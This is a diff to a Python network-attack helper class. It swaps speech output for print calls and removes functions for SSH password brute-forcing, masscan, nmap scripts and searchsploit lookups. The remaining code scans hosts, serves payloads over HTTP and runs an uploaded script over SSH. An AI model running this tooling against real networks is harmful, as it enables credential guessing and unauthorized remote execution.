@@ -3,7 +3,6 @@ import os
 import json
 from pathlib import Path
 import paramiko
-from computerspeak import ComputerSpeak as cs
 import subprocess
 import platform
 import time
@@ -27,10 +26,10 @@ def _require_portscanner():
 
 class NetRunning:
     def __init__(self):
-        self.cs = cs()
+        pass
     def scan_network(self, target_ip_range: str):
         """Scan the network for active hosts using nmap. Optionally, run specific nmap scsripts against the detected hosts."""
-        self.cs.speak(f"Scanning network range {target_ip_range} for active hosts...")
+        print(f"Scanning network range {target_ip_range} for active hosts...")
         if PortScanner is None:
             raise ModuleNotFoundError(
                 "python-nmap is not installed in the active Python environment. "
@@ -40,16 +39,16 @@ class NetRunning:
         try:
             nm.scan(hosts=target_ip_range, arguments=f'-sn -oN {target_ip_range.replace("/", "_")}_nmap_results.txt')
             active_hosts = [host for host in nm.all_hosts() if nm[host].state() == 'up']
-            self.cs.speak(f"Active hosts detected: {active_hosts}")
+            print(f"Active hosts detected: {active_hosts}")
             return active_hosts
         except Exception as e:
-            self.cs.speak(f"An error occurred while scanning the network: {e}")
+            print(f"An error occurred while scanning the network: {e}")
             return []
 
 
     def create_server(self,folder:str, port: int):
         """Create a simple HTTP server on the specified port to serve files or payloads."""
-        self.cs.speak(f"Starting simple HTTP server on port {port}")
+        print(f"Starting simple HTTP server on port {port}")
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.bind(('', port))
         if platform.system() == "Windows":
@@ -62,28 +61,10 @@ class NetRunning:
 
     def stop_server(self):
         """Stop the HTTP server."""
-        self.cs.speak("Stopping HTTP server")
+        print("Stopping HTTP server")
         if hasattr(self, 'socket'):
             self.socket.close()
 
-
-
-    def search_sploit(self, service: str):
-        """Search for exploits related to a specific service using searchsploit."""
-        self.cs.speak(f'Searching for exploits related to {service}')
-        command = f"searchsploit -c {service} -j"
-        result = self.cs.execute_command(command)
-        if result:
-            try:
-                exploits = json.loads(result)
-                self.cs.speak(f"Exploits found for {service}: {exploits}")
-                return exploits
-            except json.JSONDecodeError:
-                self.cs.speak(f"Failed to parse searchsploit output for {service}. Raw output: {result}")
-                return None
-        else:
-            self.cs.speak(f"No exploits found for {service}")
-            return None
         
     def iter_nmap_lines(self, path=None):
         if path is None:
@@ -129,8 +110,7 @@ class NetRunning:
             results["cmd4"] = run("./afile.sh")[0]
             results["cmd5"] = run("rm -f afile.sh")[0]
         client.close()
-        csi=cs()
-        csi.speak(f"SSH payload execution results: {results}")
+        print(f"SSH payload execution results: {results}")
 
         return results
 
@@ -164,7 +144,6 @@ class NetRunning:
     @staticmethod
     def check_ssh_connection(host, username, password=None):
         """Check if SSH connection to the target host is successful. This function uses the Paramiko library to attempt an SSH connection to the target IP using the provided username and password. It returns True if the connection is successful, or False if it fails. The function includes error handling to catch and report any SSH exceptions, socket errors, or unexpected exceptions that may occur during the connection attempt."""
-        csi=cs()
         ssh_client = paramiko.SSHClient()
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
@@ -172,90 +151,15 @@ class NetRunning:
             ssh_client.close()
             return True
         except paramiko.AuthenticationException:
-            csi.speak(f"SSH authentication failed for {host} with username {username}.")
+            print(f"SSH authentication failed for {host} with username {username}.")
             return False
         except paramiko.SSHException as e:
-            csi.speak(f"SSH connection failed for {host} with username {username}. SSHException: {e}")
+            print(f"SSH connection failed for {host} with username {username}. SSHException: {e}")
             return False
         except socket.error as e:
-            csi.speak(f"Socket error occurred while connecting to {host} on SSH port: {e}")
+            print(f"Socket error occurred while connecting to {host} on SSH port: {e}")
             return False
         except Exception as e:
-            csi.speak(f"An unexpected error occurred while connecting to {host} on SSH port: {e}")
+            print(f"An unexpected error occurred while connecting to {host} on SSH port: {e}")
             return False
-    @staticmethod
-    def brute_scan(target_ip_range: str, username: str, password_list: list):
-        """Perform a brute-force scan for SSH credentials on the target IP range using the provided username and a list of passwords."""
-        csi = cs()
-        nri= NetRunning()
-        csi.speak(f"Starting brute-force scan for SSH credentials on {target_ip_range} with username {username}")
-        active_hosts = nri.scan_network(target_ip_range=target_ip_range, scripts=['auth'])
-        valid_credentials = []
-        for host in active_hosts:
-            for password in password_list:
-                if NetRunning.check_ssh_connection(host, username, password):
-                    csi.speak(f"Valid SSH credentials found for {host}: {username}:{password}")
-                    valid_credentials.append((host, username, password))
-                    break  # Stop trying passwords for this host after finding valid credentials
-                else:
-                    csi.speak(f"Invalid SSH credentials for {host}: {username}:{password}")
-        csi.speak(f"Brute-force scan complete. Valid credentials found: {valid_credentials}")
-        return valid_credentials
-    @staticmethod
-    def loud_scan(target_ip_range: str, rate=1000):
-        """Perform a loud scan of the target IP range using nmap with aggressive timing and verbose output."""
-        csi = cs()
-        csi.speak(f"Starting loud scan of {target_ip_range} with rate {rate} packets per second")
-        masscanr=csi.execute_command(f"sudo masscan -p0-65535 --rate {rate} {target_ip_range} -oL loud_scan_results.txt")
-        with open("loud_scan_results.txt", "r") as f:
-            results = f.read()
-        return results
-    
-    def run_nmap_script(self, target_ip: str, script_name: str):
-        """Run a specific nmap script against the target IP and return the results."""
-        self.cs.speak(f"Running nmap script {script_name} against {target_ip}")
-        try:
-            _require_portscanner()
-        except ModuleNotFoundError as e:
-            self.cs.speak(f"Error: {e}")
-            return None
-        nm = PortScanner()
-        try:
-            nm.scan(hosts=target_ip, arguments=f'--script={script_name} -oN {target_ip}_{script_name}_results.txt')
-            if target_ip in nm.all_hosts():
-                self.cs.speak(f"Nmap script {script_name} executed successfully against {target_ip}. Results saved to {target_ip}_{script_name}_results.txt")
-                return f"{target_ip}_{script_name}_results.txt"
-            else:
-                self.cs.speak(f"Nmap script {script_name} did not find any information for {target_ip}.")
-                return None
-        except Exception as e:
-            self.cs.speak(f"An error occurred while running nmap script {script_name} against {target_ip}: {e}")
-            return None
-
-    def exploitdbforvuln(self):
-        """This function reads vulnerability scan results from text files, extracts CVE identifiers, and uses SearchSploit to find related exploits. The results are then printed and saved to separate text files. This function is designed to automate the process of correlating vulnerability scan results with known exploits, providing valuable insights for further exploitation activities. It handles any exceptions that may occur during file reading or command execution, and it logs the findings using the ComputerSpeak class."""
-        cs_i = cs()
-        vuln_files = list(Path("SurzsEnviro/SurzalsNotes/SurzalsTexts/SurzalsVulns").glob("vuln_scan_*.txt"))
-        for vuln_file in vuln_files:
-            with open(vuln_file, "r", encoding="utf-8", errors="ignore") as f:
-                content = f.read()
-                cve_matches = re.findall(r"CVE-\d{4}-\d{4,7}", content)
-                if cve_matches:
-                    for cve in set(cve_matches):
-                        cs_i.execute_command(f"Write-Output 'Searching for exploits related to {cve}...'")
-                        exploit_results = cs_i.execute_command(f"searchsploit {cve} --json")
-                        if exploit_results:
-                            cs_i.execute_command(f"Write-Output 'Exploit search results for {cve}:'")
-                            cs_i.execute_command(f"Write-Output '{exploit_results}'")
-                            with open(f"SurzsEnviro/SurzalsNotes/SurzalsTexts/SurzalsExploits/exploit_search_{cve}.txt", "w", encoding="utf-8") as exploit_file:
-                                exploit_file.write(exploit_results)
-                        else:
-                            cs_i.execute_command(f"Write-Output 'No exploits found for {cve}.'")
-                        print(f"Exploit search results for {cve}:\n{exploit_results}")
-                else:
-                    cs_i.execute_command(f"Write-Output 'No CVE identifiers found in {vuln_file}.'")
-                    print(f"No CVE identifiers found in {vuln_file}.")
-                return cve_matches if cve_matches else None #there we go
-
-
-                                
+ 
